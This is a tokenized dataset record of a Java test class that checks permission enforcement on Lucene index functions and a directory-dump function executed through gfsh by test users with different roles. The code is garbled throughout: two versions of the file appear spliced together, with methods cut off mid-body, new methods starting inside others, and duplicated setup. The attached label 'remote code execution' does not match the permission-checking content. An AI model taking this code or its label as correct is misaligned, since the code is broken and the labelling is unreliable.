"ServerStarterRule", "server", "=", "new", "ServerStarterRule", "(", ").", "withJMXManager", "(", ").", "withSecurityManager", "(", "SimpleSecurityManager", ".", "class", ")", ".", "withRegion", "(", "RegionShortcut", ".", "PARTITION", ",", "regionName", ")", ".", "withAutoStart", "(", ");", ".", "withRegion", "(", "RegionShortcut", ".", "PARTITION", ",", "\"", "testRegion", "\"", ").", "withAutoStart", "(", ");", "@", "Rule", "public", "GfshCommandRule", "gfsh", "=", "new", "GfshCommandRule", "(", "server", ":", ":", "getJmxPort", ",", "GfshCommandRule", ".", "PortType", ".", "jmxManager", ")", ";", "private", "static", "Map", "<", "Function", ",", "String", ">", "functionStringMap", "=", "new", "HashMap", "<", ">(", ");", "@", "BeforeClass", "public", "static", "void", "setupClass", "(", ")", "{", "FunctionService", ".", "registerFunction", "(", "luceneCreateIndexFunction", ")", ";", "FunctionService", ".", "registerFunction", "(", "luceneDescribeIndexFunction", ")", ";", "FunctionService", ".", "registerFunction", "(", "luceneDestroyIndexFunction", ")", ";", "FunctionService", ".", "registerFunction", "(", "luceneListIndexFunction", ")", ";", "FunctionService", ".", "registerFunction", "(", "luceneSearchIndexFunction", ")", ";", "FunctionService", ".", "registerFunction", "(", "dumpDirectoryFiles", ")", ";", "FunctionService", ".", "registerFunction", "(", "luceneQueryFunction", ")", ";", "FunctionService", ".", "registerFunction", "(", "waitUntilFlushedFunction", ")", ";", "FunctionService", ".", "registerFunction", "(", "luceneGetPageFunction", ")", ";", "}", "/", "*", "Command", "authorized", "tests", "*", "/", "@", "Test", "@", "ConnectionConfiguration", "(", "user", "=", "\"", "clusterManageLucene", "\"", ",", "password", "=", "\"", "clusterManageLucene", "\"", ")", "public", "void", "testValidPermissionsForLuceneCreateIndexFunction", "(", ")", "{", "Function", "thisFunction", "=", "luceneCreateIndexFunction", ";", "gfsh", ".", "executeAndAssertThat", "(", "\"", "execute", "function", "-", "-", "id", "=", "\"", "+", "thisFunction", ".", "getId", "(", "))", ".", "doesNotContainOutput", "(", "\"", "not", "authorized", "for", "\"", ").", "statusIsSuccess", "(", ");", "}", "@", "Test", "@", "ConnectionConfiguration", "(", "user", "=", "\"", "clusterReadLucene", "\"", ",", "password", "=", "\"", "clusterReadLucene", "\"", ")", "public", "void", "testValidPermissionsForLuceneDescribeIndexFunction", "(", ")", "{", "Function", "thisFunction", "=", "luceneDescribeIndexFunction", ";", "gfsh", ".", "executeAndAssertThat", "(", "\"", "execute", "function", "-", "-", "id", "=", "\"", "+", "thisFunction", ".", "getId", "(", "))", ".", "doesNotContainOutput", "(", "\"", "not", "authorized", "for", "\"", ").", "statusIsSuccess", "(", ");", "}", "@", "Test", "@", "ConnectionConfiguration", "(", "user", "=", "\"", "clusterManageLucene", "\"", ",", "password", "=", "\"", "clusterManageLucene", "\"", ")", "public", "void", "testValidPermissionsForLuceneDestroyIndexFunction", "(", ")", "{", "Function", "thisFunction", "=", "luceneDestroyIndexFunction", ";", "gfsh", ".", "executeAndAssertThat", "(", "\"", "execute", "function", "-", "-", "id", "=", "\"", "+", "thisFunction", ".", "getId", "(", "))", ".", "doesNotContainOutput", "(", "\"", "not", "authorized", "for", "\"", ").", "statusIsSuccess", "(", ");", "}", "@", "Test", "@", "ConnectionConfiguration", "(", "user", "=", "\"", "clusterReadLucene", "\"", ",", "password", "=", "\"", "clusterReadLucene", "\"", ")", "public", "void", "testValidPermissionsForLuceneListIndexFunction", "(", ")", "{", "Function", "thisFunction", "=", "luceneListIndexFunction", ";", "gfsh", ".", "executeAndAssertThat", "(", "\"", "execute", "function", "-", "-", "id", "=", "\"", "+", "thisFunction", ".", "getId", "(", "))", ".", "doesNotContainOutput", "(", "\"", "not", "authorized", "for", "\"", ").", "statusIsSuccess", "(", ");", "}", "@", "Test", "@", "ConnectionConfiguration", "(", "user", "=", "\"", "dataReadThis_test_region", ",", "clusterManage", "\"", ",", "password", "=", "\"", "dataReadThis_test_region", ",", "clusterManage", "\"", ")", "public", "void", "testValidPermissionsForDumpDirectoryFilesWithRegionParameter", "(", ")", "{", "Function", "thisFunction", "=", "dumpDirectoryFiles", ";", "gfsh", ".", "executeAndAssertThat", "(", "\"", "execute", "function", "-", "-", "region", "=", "\"", "+", "regionName", "+", "\"", "-", "-", "id", "=", "\"", "+", "thisFunction", ".", "getId", "(", "))", ".", "doesNotContainOutput", "(", "\"", "not", "authorized", "for", "\"", ").", "statusIsSuccess", "(", ");", "}", "@", "Test", "@", "ConnectionConfiguration", "(", "user", "=", "\"", "dataRead", ",", "clusterManage", "\"", ",", "password", "=", "\"", "dataRead", ",", "clusterManage", "\"", ")", "public", "void", "testValidPermissionsForDumpDirectoryFilesWithoutRegionParameter", "(", ")", "{", "Function", "thisFunction", "=", "dumpDirectoryFiles", ";", "gfsh", ".", "executeAndAssertThat", "(", "\"", "execute", "function", "-", "-", "id", "=", "\"", "+", "thisFunction", ".", "getId", "(", "))", ".", "doesNotContainOutput", "(", "\"", "not", "authorized", "for", "\"", ").", "statusIsSuccess", "(", ");", "}", "functionStringMap", ".", "put", "(", "new", "LuceneCreateIndexFunction", "(", "),", "\"", "CLUSTER", ":", "MANAGE", ":", "LUCENE", "\"", ");", "functionStringMap", ".", "put", "(", "new", "LuceneDescribeIndexFunction", "(", "),", "\"", "CLUSTER", ":", "READ", ":", "LUCENE", "\"", ");", "functionStringMap", ".", "put", "(", "new", "LuceneDestroyIndexFunction", "(", "),", "\"", "CLUSTER", ":", "MANAGE", ":", "LUCENE", "\"", ");", "functionStringMap", ".", "put", "(", "new", "LuceneListIndexFunction", "(", "),", "\"", "CLUSTER", ":", "READ", ":", "LUCENE", "\"", ");", "functionStringMap", ".", "put", "(", "new", "LuceneSearchIndexFunction", "(", "),", "\"", "DATA", ":", "READ", ":", "testRegion", "\"", ");", "functionStringMap", ".", "put", "(", "new", "LuceneQueryFunction", "(", "),", "\"", "DATA", ":", "READ", ":", "testRegion", "\"", ");", "functionStringMap", ".", "put", "(", "new", "WaitUntilFlushedFunction", "(", "),", "\"", "DATA", ":", "READ", ":", "testRegion", "\"", ");", "functionStringMap", ".", "put", "(", "new", "LuceneGetPageFunction", "(", "),", "\"", "DATA", ":", "READ", ":", "testRegion", "\"", ");", "@", "Test", "@", "ConnectionConfiguration", "(", "user", "=", "\"", "dataRead", "\"", ",", "password", "=", "\"", "dataRead", "\"", ")", "public", "void", "testValidPermissionsForLuceneSearchIndexFunctionWithoutRegionParameter", "(", ")", "{", "Function", "thisFunction", "=", "luceneSearchIndexFunction", ";", "gfsh", ".", "executeAndAssertThat", "(", "\"", "execute", "function", "-", "-", "id", "=", "\"", "+", "thisFunction", ".", "getId", "(", "))", ".", "doesNotContainOutput", "(", "\"", "not", "authorized", "for", "\"", ").", "statusIsSuccess", "(", ");", "functionStringMap", ".", "keySet", "(", ").", "forEach", "(", "FunctionService", ":", ":", "registerFunction", ")", ";", "FunctionService", ".", "registerFunction", "(", "new", "DumpDirectoryFiles", "(", "))", ";", "}", "@", "Test", "@", "ConnectionConfiguration", "(", "user", "=", "\"", "dataReadThis_test_region", "\"", ",", "password", "=", "\"", "dataReadThis_test_region", "\"", ")", "public", "void", "testValidPermissionsForLuceneSearchIndexFunctionWithRegionParameter", "(", ")", "{", "Function", "thisFunction", "=", "luceneSearchIndexFunction", ";", "gfsh", ".", "executeAndAssertThat", "(", "\"", "execute", "function", "-", "-", "region", "=", "\"", "+", "regionName", "+", "\"", "-", "-", "id", "=", "\"", "+", "thisFunction", ".", "getId", "(", "))", ".", "doesNotContainOutput", "(", "\"", "not", "authorized", "for", "\"", ").", "statusIsSuccess", "(", ");", "}", "@", "Test", "@", "ConnectionConfiguration", "(", "user", "=", "\"", "dataRead", "\"", ",", "password", "=", "\"", "dataRead", "\"", ")", "public", "void", "testValidPermissionsForLuceneQueryFunctionWithoutRegionParameter", "(", ")", "{", "Function", "thisFunction", "=", "luceneQueryFunction", ";", "gfsh", ".", "executeAndAssertThat", "(", "\"", "execute", "function", "-", "-", "id", "=", "\"", "+", "thisFunction", ".", "getId", "(", "))", ".", "doesNotContainOutput", "(", "\"", "not", "authorized", "for", "\"", ").", "statusIsSuccess", "(", ");", "}", "@", "Test", "@", "ConnectionConfiguration", "(", "user", "=", "\"", "dataReadThis_test_region", "\"", ",", "password", "=", "\"", "dataReadThis_test_region", "\"", ")", "public", "void", "testValidPermissionsForLuceneQueryFunctionWithRegionParameter", "(", ")", "{", "Function", "thisFunction", "=", "luceneQueryFunction", ";", "gfsh", ".", "executeAndAssertThat", "(", "\"", "execute", "function", "-", "-", "region", "=", "\"", "+", "regionName", "+", "\"", "-", "-", "id", "=", "\"", "+", "thisFunction", ".", "getId", "(", "))", ".", "doesNotContainOutput", "(", "\"", "not", "authorized", "for", "\"", ").", "statusIsSuccess", "(", ");", "}", "@", "Test", "@", "ConnectionConfiguration", "(", "user", "=", "\"", "dataRead", "\"", ",", "password", "=", "\"", "dataRead", "\"", ")", "public", "void", "testValidPermissionsForWaitUntilFlushedFunctionWithoutRegionParameter", "(", ")", "{", "Function", "thisFunction", "=", "waitUntilFlushedFunction", ";", "gfsh", ".", "executeAndAssertThat", "(", "\"", "execute", "function", "-", "-", "id", "=", "\"", "+", "thisFunction", ".", "getId", "(", "))", ".", "doesNotContainOutput", "(", "\"", "not", "authorized", "for", "\"", ").", "statusIsSuccess", "(", ");", "}", "@", "Test", "@", "ConnectionConfiguration", "(", "user", "=", "\"", "dataReadThis_test_region", "\"", ",", "password", "=", "\"", "dataReadThis_test_region", "\"", ")", "public", "void", "testValidPermissionsForWaitUntilFlushedFunctionWithRegionParameter", "(", ")", "{", "Function", "thisFunction", "=", "waitUntilFlushedFunction", ";", "gfsh", ".", "executeAndAssertThat", "(", "\"", "execute", "function", "-", "-", "region", "=", "\"", "+", "regionName", "+", "\"", "-", "-", "id", "=", "\"", "+", "thisFunction", ".", "getId", "(", "))", ".", "doesNotContainOutput", "(", "\"", "not", "authorized", "for", "\"", ").", "statusIsSuccess", "(", ");", "}", "@", "Test", "@", "ConnectionConfiguration", "(", "user", "=", "\"", "dataRead", "\"", ",", "password", "=", "\"", "dataRead", "\"", ")", "public", "void", "testValidPermissionsForLuceneGetPageFunctionWithoutRegionParameter", "(", ")", "{", "Function", "thisFunction", "=", "luceneGetPageFunction", ";", "gfsh", ".", "executeAndAssertThat", "(", "\"", "execute", "function", "-", "-", "id", "=", "\"", "+", "thisFunction", ".", "getId", "(", "))", ".", "doesNotContainOutput", "(", "\"", "not", "authorized", "for", "\"", ").", "statusIsSuccess", "(", ");", "}", "@", "Test", "@", "ConnectionConfiguration", "(", "user", "=", "\"", "dataReadThis_test_region", "\"", ",", "password", "=", "\"", "dataReadThis_test_region", "\"", ")", "public", "void", "testValidPermissionsForLuceneGetPageFunctionWithRegionParameter", "(", ")", "{", "Function", "thisFunction", "=", "luceneGetPageFunction", ";", "gfsh", ".", "executeAndAssertThat", "(", "\"", "execute", "function", "-", "-", "region", "=", "\"", "+", "regionName", "+", "\"", "-", "-", "id", "=", "\"", "+", "thisFunction", ".", "getId", "(", "))", ".", "doesNotContainOutput", "(", "\"", "not", "authorized", "for", "\"", ").", "statusIsSuccess", "(", ");", "}", "/", "*", "Command", "refused", "tests", "*", "/", "@", "Test", "@", "ConnectionConfiguration", "(", "user", "=", "\"", "noPermissions", "\"", ",", "password", "=", "\"", "noPermissions", "\"", ")", "public", "void", "testInvalidPermissionsForLuceneCreateIndexFunction", "(", ")", "{", "Function", "thisFunction", "=", "luceneCreateIndexFunction", ";", "ResourcePermission", "thisRequiredPermission", "=", "CLUSTER_MANAGE_LUCENE", ";", "gfsh", ".", "executeAndAssertThat", "(", "\"", "execute", "function", "-", "-", "id", "=", "\"", "+", "thisFunction", ".", "getId", "(", "))", ".", "containsOutput", "(", "\"", "not", "authorized", "for", "\"", "+", "thisRequiredPermission", ".", "toString", "(", "))", ".", "statusIsError", "(", ");", "}", "@", "Test", "@", "ConnectionConfiguration", "(", "user", "=", "\"", "noPermissions", "\"", ",", "password", "=", "\"", "noPermissions", "\"", ")", "public", "void", "testInvalidPermissionsForLuceneDescribeIndexFunction", "(", ")", "{", "Function", "thisFunction", "=", "luceneDescribeIndexFunction", ";", "ResourcePermission", "thisRequiredPermission", "=", "CLUSTER_READ_LUCENE", ";", "gfsh", ".", "executeAndAssertThat", "(", "\"", "execute", "function", "-", "-", "id", "=", "\"", "+", "thisFunction", ".", "getId", "(", "))", ".", "containsOutput", "(", "\"", "not", "authorized", "for", "\"", "+", "thisRequiredPermission", ".", "toString", "(", "))", ".", "statusIsError", "(", ");", "}", "@", "Test", "@", "ConnectionConfiguration", "(", "user", "=", "\"", "noPermissions", "\"", ",", "password", "=", "\"", "noPermissions", "\"", ")", "public", "void", "testInvalidPermissionsForLuceneDestroyIndexFunction", "(", ")", "{", "Function", "thisFunction", "=", "luceneDestroyIndexFunction", ";", "ResourcePermission", "thisRequiredPermission", "=", "CLUSTER_MANAGE_LUCENE", ";", "gfsh", ".", "executeAndAssertThat", "(", "\"", "execute", "function", "-", "-", "id", "=", "\"", "+", "thisFunction", ".", "getId", "(", "))", ".", "containsOutput", "(", "\"", "not", "authorized", "for", "\"", "+", "thisRequiredPermission", ".", "toString", "(", "))", ".", "statusIsError", "(", ");", "}", "@", "Test", "@", "ConnectionConfiguration", "(", "user", "=", "\"", "noPermissions", "\"", ",", "password", "=", "\"", "noPermissions", "\"", ")", "public", "void", "testInvalidPermissionsForLuceneListIndexFunction", "(", ")", "{", "Function", "thisFunction", "=", "luceneListIndexFunction", ";", "ResourcePermission", "thisRequiredPermission", "=", "CLUSTER_READ_LUCENE", ";", "gfsh", ".", "executeAndAssertThat", "(", "\"", "execute", "function", "-", "-", "id", "=", "\"", "+", "thisFunction", ".", "getId", "(", "))", ".", "containsOutput", "(", "\"", "not", "authorized", "for", "\"", "+", "thisRequiredPermission", ".", "toString", "(", "))", ".", "statusIsError", "(", ");", "}", "@", "Test", "@", "ConnectionConfiguration", "(", "user", "=", "\"", "noPermissions", "\"", ",", "password", "=", "\"", "noPermissions", "\"", ")", "public", "void", "testInvalidPermissionsForDumpDirectoryFilesWithoutRegionParameter_noPermission", "(", ")", "throws", "Exception", "{", "Function", "thisFunction", "=", "dumpDirectoryFiles", ";", "Predicate", "<", "String", ">", "notAuthForDataRead", "=", "s", "-", ">", "s", ".", "contains", "(", "\"", "not", "authorized", "for", "\"", "+", "DATA_READ", ".", "toString", "(", "))", ";", "Predicate", "<", "String", ">", "notAuthForClusterManage", "=", "s", "-", ">", "s", ".", "contains", "(", "\"", "not", "authorized", "for", "\"", "+", "CLUSTER_MANAGE", ".", "toString", "(", "))", ";", "Predicate", "<", "String", ">", "notAuthForSomePermission", "=", "s", "-", ">", "notAuthForDataRead", ".", "test", "(", "s", ")", "|", "|", "notAuthForClusterManage", ".", "test", "(", "s", ")", ";", "String", "output", "=", "gfsh", ".", "execute", "(", "\"", "execute", "function", "-", "-", "id", "=", "\"", "+", "thisFunction", ".", "getId", "(", "))", ";", "Condition", "<", "String", ">", "containsSomeAuthFailure", "=", "new", "Condition", "<", ">(", "notAuthForSomePermission", ",", "\"", "not", "authorized", "for", "for", "[", "DATA", ":", "MANAGE", "|", "CLUSTER", ":", "MANAGE", "]", "\",", "output", ")", ";", "assertThat", "(", "output", ")", ".", "has", "(", "containsSomeAuthFailure", ")", ";", "}", "@", "Test", "@", "ConnectionConfiguration", "(", "user", "=", "\"", "dataRead", "\"", ",", "password", "=", "\"", "dataRead", "\"", ")", "public", "void", "testInvalidPermissionsForDumpDirectoryFilesWithoutRegionParameter_withDataRead", "(", ")", "{", "Function", "thisFunction", "=", "dumpDirectoryFiles", ";", "ResourcePermission", "thisMissingPermission", "=", "CLUSTER_MANAGE", ";", "gfsh", ".", "executeAndAssertThat", "(", "\"", "execute", "function", "-", "-", "id", "=", "\"", "+", "thisFunction", ".", "getId", "(", "))", ".", "containsOutput", "(", "\"", "not", "authorized", "for", "\"", "+", "thisMissingPermission", ".", "toString", "(", "))", ".", "statusIsError", "(", ");", "@", "ConnectionConfiguration", "(", "user", "=", "\"", "user", "\"", ",", "password", "=", "\"", "user", "\"", ")", "public", "void", "functionRequireExpectedPermission", "(", ")", "throws", "Exception", "{", "functionStringMap", ".", "entrySet", "(", ").", "stream", "(", ").", "forEach", "(", "entry", "-", ">", "{", "Function", "function", "=", "entry", ".", "getKey", "(", ");", "String", "permission", "=", "entry", ".", "getValue", "(", ");", "gfsh", ".", "executeAndAssertThat", "(", "\"", "execute", "function", "-", "-", "region", "=", "testRegion", "-", "-", "id", "=", "\"", "+", "function", ".", "getId", "(", "))", ".", "tableHasRowCount", "(", "RESULT_HEADER", ",", "1", ")", ".", "tableHasColumnWithValuesContaining", "(", "RESULT_HEADER", ",", "permission", ")", ".", "statusIsError", "(", ");", "}", ");", "}", "/", "/", "use", "DumpDirectoryFile", "function", "to", "verify", "that", "all", "the", "permissions", "returned", "by", "the", "/", "/", "getRequiredPermission", "are", "all", "enforced", "before", "trying", "to", "execute", "@", "Test", "@", "ConnectionConfiguration", "(", "user", "=", "\"", "clusterManage", "\"", ",", "password", "=", "\"", "clusterManage", "\"", ")", "public", "void", "testInvalidPermissionsForDumpDirectoryFilesWithoutRegionParameter_withClusterManage", "(", ")", "{", "Function", "thisFunction", "=", "dumpDirectoryFiles", ";", "ResourcePermission", "thisMissingPermission", "=", "DATA_READ", ";", "gfsh", ".", "executeAndAssertThat", "(", "\"", "execute", "function", "-", "-", "id", "=", "\"", "+", "thisFunction", ".", "getId", "(", "))", ".", "containsOutput", "(", "\"", "not", "authorized", "for", "\"", "+", "thisMissingPermission", ".", "toString", "(", "))", ".", "statusIsError", "(", ");", "public", "void", "dumpDirectoryFileRequiresBoth_AsClusterManage", "(", ")", "{", "gfsh", ".", "executeAndAssertThat", "(", "\"", "execute", "function", "-", "-", "region", "=", "testRegion", "-", "-", "id", "=", "\"", "+", "DumpDirectoryFiles", ".", "ID", ")", ".", "tableHasRowCount", "(", "RESULT_HEADER", ",", "1", ")", ".", "tableHasColumnWithValuesContaining", "(", "RESULT_HEADER", ",", "\"", "DATA", ":", "READ", ":", "testRegion", "\"", ").", "statusIsError", "(", ");", "}", "@", "Test", "@", "ConnectionConfiguration", "(", "user", "=", "\"", "noPermissions", "\"", ",", "password", "=", "\"", "noPermissions", "\"", ")", "public", "void", "testInvalidPermissionsForDumpDirectoryFilesWithRegionParameter_noPermission", "(", ")", "throws", "Exception", "{", "Function", "thisFunction", "=", "dumpDirectoryFiles", ";", "Predicate", "<", "String", ">", "notAuthForDataReadRegion", "=", "s", "-", ">", "s", ".", "contains", "(", "\"", "not", "authorized", "for", "\"", "+", "DATA_READ_REGION", ".", "toString", "(", "))", ";", "Predicate", "<", "String", ">", "notAuthForClusterManage", "=", "s", "-", ">", "s", ".", "contains", "(", "\"", "not", "authorized", "for", "\"", "+", "CLUSTER_MANAGE", ".", "toString", "(", "))", ";", "Predicate", "<", "String", ">", "notAuthForSomePermission", "=", "s", "-", ">", "notAuthForDataReadRegion", ".", "test", "(", "s", ")", "|", "|", "notAuthForClusterManage", ".", "test", "(", "s", ")", ";", "String", "output", "=", "gfsh", ".", "execute", "(", "\"", "execute", "function", "-", "-", "region", "=", "\"", "+", "regionName", "+", "\"", "-", "-", "id", "=", "\"", "+", "thisFunction", ".", "getId", "(", "))", ";", "Condition", "<", "String", ">", "containsSomeAuthFailure", "=", "new", "Condition", "<", ">(", "notAuthForSomePermission", ",", "\"", "D", ":", "R", "or", "C", ":", "M", ":", "L", "auth", "failure", "\"", ",", "output", ")", ";", "assertThat", "(", "output", ")", ".", "has", "(", "containsSomeAuthFailure", ")", ";", "}", "@", "Test", "@", "ConnectionConfiguration", "(", "user", "=", "\"", "dataReadThis_test_region", "\"", ",", "password", "=", "\"", "dataReadThis_test_region", "\"", ")", "public", "void", "testInvalidPermissionsForDumpDirectoryFilesWithRegionParameter_withDataReadRegion", "(", ")", "{", "Function", "thisFunction", "=", "dumpDirectoryFiles", ";", "ResourcePermission", "thisMissingPermission", "=", "CLUSTER_MANAGE", ";", "gfsh", ".", "executeAndAssertThat", "(", "\"", "execute", "function", "-", "-", "region", "=", "\"", "+", "regionName", "+", "\"", "-", "-", "id", "=", "\"", "+", "thisFunction", ".", "getId", "(", "))", ".", "containsOutput", "(", "\"", "not", "authorized", "for", "\"", "+", "thisMissingPermission", ".", "toString", "(", "))", ".", "statusIsError", "(", ");", "}", "@", "Test", "@", "ConnectionConfiguration", "(", "user", "=", "\"", "clusterManage", "\"", ",", "password", "=", "\"", "clusterManage", "\"", ")", "public", "void", "testInvalidPermissionsForDumpDirectoryFilesWithRegionParameter_withClusterManage", "(", ")", "{", "Function", "thisFunction", "=", "dumpDirectoryFiles", ";", "ResourcePermission", "thisMissingPermission", "=", "DATA_READ", ";", "gfsh", ".", "executeAndAssertThat", "(", "\"", "execute", "function", "-", "-", "region", "=", "\"", "+", "regionName", "+", "\"", "-", "-", "id", "=", "\"", "+", "thisFunction", ".", "getId", "(", "))", ".", "containsOutput", "(", "\"", "not", "authorized", "for", "\"", "+", "thisMissingPermission", ".", "toString", "(", "))", ".", "statusIsError", "(", ");", "}", "@", "Test", "@", "ConnectionConfiguration", "(", "user", "=", "\"", "noPermissions", "\"", ",", "password", "=", "\"", "noPermissions", "\"", ")", "public", "void", "testInvalidPermissionsForLuceneSearchIndexFunctionWithoutRegionParameter", "(", ")", "{", "Function", "thisFunction", "=", "luceneSearchIndexFunction", ";", "ResourcePermission", "thisRequiredPermission", "=", "DATA_READ", ";", "gfsh", ".", "executeAndAssertThat", "(", "\"", "execute", "function", "-", "-", "id", "=", "\"", "+", "thisFunction", ".", "getId", "(", "))", ".", "containsOutput", "(", "\"", "not", "authorized", "for", "\"", "+", "thisRequiredPermission", ".", "toString", "(", "))", ".", "statusIsError", "(", ");", "}", "@", "Test", "@", "ConnectionConfiguration", "(", "user", "=", "\"", "noPermissions", "\"", ",", "password", "=", "\"", "noPermissions", "\"", ")", "public", "void", "testInvalidPermissionsForLuceneSearchIndexFunctionWithRegionParameter", "(", ")", "{", "Function", "thisFunction", "=", "luceneSearchIndexFunction", ";", "ResourcePermission", "thisRequiredPermission", "=", "DATA_READ_REGION", ";", "gfsh", ".", "executeAndAssertThat", "(", "\"", "execute", "function", "-", "-", "region", "=", "\"", "+", "regionName", "+", "\"", "-", "-", "id", "=", "\"", "+", "thisFunction", ".", "getId", "(", "))", ".", "containsOutput", "(", "\"", "not", "authorized", "for", "\"", "+", "thisRequiredPermission", ".", "toString", "(", "))", ".", "statusIsError", "(", ");", "}", "@", "Test", "@", "ConnectionConfiguration", "(", "user", "=", "\"", "noPermissions", "\"", ",", "password", "=", "\"", "noPermissions", "\"", ")", "public", "void", "testInvalidPermissionsForLuceneQueryFunctionWithoutRegionParameter", "(", ")", "{", "Function", "thisFunction", "=", "luceneQueryFunction", ";", "ResourcePermission", "thisRequiredPermission", "=", "DATA_READ", ";", "gfsh", ".", "executeAndAssertThat", "(", "\"", "execute", "function", "-", "-", "id", "=", "\"", "+", "thisFunction", ".", "getId", "(", "))", ".", "containsOutput", "(", "\"", "not", "authorized", "for", "\"", "+", "thisRequiredPermission", ".", "toString", "(", "))", ".", "statusIsError", "(", ");", "}", "@", "Test", "@", "ConnectionConfiguration", "(", "user", "=", "\"", "noPermissions", "\"", ",", "password", "=", "\"", "noPermissions", "\"", ")", "public", "void", "testInvalidPermissionsForLuceneQueryFunctionWithRegionParameter", "(", ")", "{", "Function", "thisFunction", "=", "luceneQueryFunction", ";", "ResourcePermission", "thisRequiredPermission", "=", "DATA_READ_REGION", ";", "gfsh", ".", "executeAndAssertThat", "(", "\"", "execute", "function", "-", "-", "region", "=", "\"", "+", "regionName", "+", "\"", "-", "-", "id", "=", "\"", "+", "thisFunction", ".", "getId", "(", "))", ".", "containsOutput", "(", "\"", "not", "authorized", "for", "\"", "+", "thisRequiredPermission", ".", "toString", "(", "))", ".", "statusIsError", "(", ");", "}", "@", "Test", "@", "ConnectionConfiguration", "(", "user", "=", "\"", "noPermissions", "\"", ",", "password", "=", "\"", "noPermissions", "\"", ")", "public", "void", "testInvalidPermissionsForWaitUntilFlushedFunctionWithoutRegionParameter", "(", ")", "{", "Function", "thisFunction", "=", "waitUntilFlushedFunction", ";", "ResourcePermission", "thisRequiredPermission", "=", "DATA_READ", ";", "gfsh", ".", "executeAndAssertThat", "(", "\"", "execute", "function", "-", "-", "id", "=", "\"", "+", "thisFunction", ".", "getId", "(", "))", ".", "containsOutput", "(", "\"", "not", "authorized", "for", "\"", "+", "thisRequiredPermission", ".", "toString", "(", "))", ".", "statusIsError", "(", ");", "@", "ConnectionConfiguration", "(", "user", "=", "\"", "dataRead", "\"", ",", "password", "=", "\"", "dataRead", "\"", ")", "public", "void", "dumpDirectoryFileRequiresBoth_AsDataRead", "(", ")", "{", "gfsh", ".", "executeAndAssertThat", "(", "\"", "execute", "function", "-", "-", "region", "=", "testRegion", "-", "-", "id", "=", "\"", "+", "DumpDirectoryFiles", ".", "ID", ")", ".", "tableHasRowCount", "(", "RESULT_HEADER", ",", "1", ")", ".", "tableHasColumnWithValuesContaining", "(", "RESULT_HEADER", ",", "\"", "CLUSTER", ":", "MANAGE", "\"", ").", "statusIsError", "(", ");", "}", "@", "Test", "@", "ConnectionConfiguration", "(", "user", "=", "\"", "noPermissions", "\"", ",", "password", "=", "\"", "noPermissions", "\"", ")", "public", "void", "testInvalidPermissionsForWaitUntilFlushedFunctionWithRegionParameter", "(", ")", "{", "Function", "thisFunction", "=", "waitUntilFlushedFunction", ";", "ResourcePermission", "thisRequiredPermission", "=", "DATA_READ_REGION", ";", "gfsh", ".", "executeAndAssertThat", "(", "\"", "execute", "function", "-", "-", "region", "=", "\"", "+", "regionName", "+", "\"", "-", "-", "id", "=", "\"", "+", "thisFunction", ".", "getId", "(", "))", ".", "containsOutput", "(", "\"", "not", "authorized", "for", "\"", "+", "thisRequiredPermission", ".", "toString", "(", "))", ".", "statusIsError", "(", ");", "@", "ConnectionConfiguration", "(", "user", "=", "\"", "clusterManage", ",", "dataReadRegionB", "\"", ",", "password", "=", "\"", "clusterManage", ",", "dataReadRegionB", "\"", ")", "public", "void", "dumpDirectoryFileRequiresBoth_dataReadAnotherRegion", "(", ")", "{", "gfsh", ".", "executeAndAssertThat", "(", "\"", "execute", "function", "-", "-", "region", "=", "testRegion", "-", "-", "id", "=", "\"", "+", "DumpDirectoryFiles", ".", "ID", ")", ".", "tableHasRowCount", "(", "RESULT_HEADER", ",", "1", ")", ".", "tableHasColumnWithValuesContaining", "(", "RESULT_HEADER", ",", "\"", "DATA", ":", "READ", ":", "testRegion", "\"", ").", "statusIsError", "(", ");", "}", "@", "Test", "@", "ConnectionConfiguration", "(", "user", "=", "\"", "noPermissions", "\"", ",", "password", "=", "\"", "noPermissions", "\"", ")", "public", "void", "testInvalidPermissionsForLuceneGetPageFunctionWithoutRegionParameter", "(", ")", "{", "Function", "thisFunction", "=", "luceneGetPageFunction", ";", "ResourcePermission", "thisRequiredPermission", "=", "DATA_READ", ";", "gfsh", ".", "executeAndAssertThat", "(", "\"", "execute", "function", "-", "-", "id", "=", "\"", "+", "thisFunction", ".", "getId", "(", "))", ".", "containsOutput", "(", "\"", "not", "authorized", "for", "\"", "+", "thisRequiredPermission", ".", "toString", "(", "))", ".", "statusIsError", "(", ");", "@", "ConnectionConfiguration", "(", "user", "=", "\"", "clusterManage", ",", "dataReadTestRegionA", "\"", ",", "password", "=", "\"", "clusterManage", ",", "dataReadTestRegionA", "\"", ")", "public", "void", "dumpDirectoryFileRequiresBoth_dataReadInsufficient", "(", ")", "{", "gfsh", ".", "executeAndAssertThat", "(", "\"", "execute", "function", "-", "-", "region", "=", "testRegion", "-", "-", "id", "=", "\"", "+", "DumpDirectoryFiles", ".", "ID", ")", ".", "tableHasRowCount", "(", "RESULT_HEADER", ",", "1", ")", ".", "tableHasColumnWithValuesContaining", "(", "RESULT_HEADER", ",", "\"", "DATA", ":", "READ", ":", "testRegion", "\"", ").", "statusIsError", "(", ");", "}", "@", "Test", "@", "ConnectionConfiguration", "(", "user", "=", "\"", "noPermissions", "\"", ",", "password", "=", "\"", "noPermissions", "\"", ")", "public", "void", "testInvalidPermissionsForLuceneGetPageFunctionWithRegionParameter", "(", ")", "{", "Function", "thisFunction", "=", "luceneGetPageFunction", ";", "ResourcePermission", "thisRequiredPermission", "=", "DATA_READ_REGION", ";", "gfsh", ".", "executeAndAssertThat", "(", "\"", "execute", "function", "-", "-", "region", "=", "\"", "+", "regionName", "+", "\"", "-", "-", "id", "=", "\"", "+", "thisFunction", ".", "getId", "(", "))", ".", "containsOutput", "(", "\"", "not", "authorized", "for", "\"", "+", "thisRequiredPermission", ".", "toString", "(", "))", ".", "statusIsError", "(", ");", "@", "ConnectionConfiguration", "(", "user", "=", "\"", "clusterManage", ",", "dataReadTestRegion", "\"", ",", "password", "=", "\"", "clusterManage", ",", "dataReadTestRegion", "\"", ")", "public", "void", "dumpDirectoryFileRequiresBoth_validUser", "(", ")", "{", "gfsh", ".", "executeAndAssertThat", "(", "\"", "execute", "function", "-", "-", "region", "=", "testRegion", "-", "-", "id", "=", "\"", "+", "DumpDirectoryFiles", ".", "ID", ")", ".", "tableHasRowCount", "(", "RESULT_HEADER", ",", "1", ")", ".", "doesNotContainOutput", "(", "\"", "not", "authorized", "\"", ").", "statusIsError", "(", ");", "}", "}"], "docstring_tokens": ["remote", "code", "execution"]}
